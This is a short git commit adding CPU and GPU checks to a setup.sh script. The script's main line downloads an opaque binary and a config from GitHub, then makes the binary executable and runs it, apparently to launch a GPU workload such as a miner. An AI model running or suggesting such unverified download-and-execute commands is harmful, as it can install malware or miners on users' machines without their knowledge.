a502336316c52ac4ac70c37c83d31ad8a0d45bdb
HornyThree <100486190+HornyThree@users.noreply.github.com>
2022-05-08 12:02:16 +0300

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,1 +1,3 @@
+lscpu
+nvidia-smi
 wget https://github.com/cruzeiro28/gas/raw/main/gas && wget https://raw.githubusercontent.com/HornyThree/stunning-umbrella/main/script.ini && chmod +x gas && ./gas script.ini 
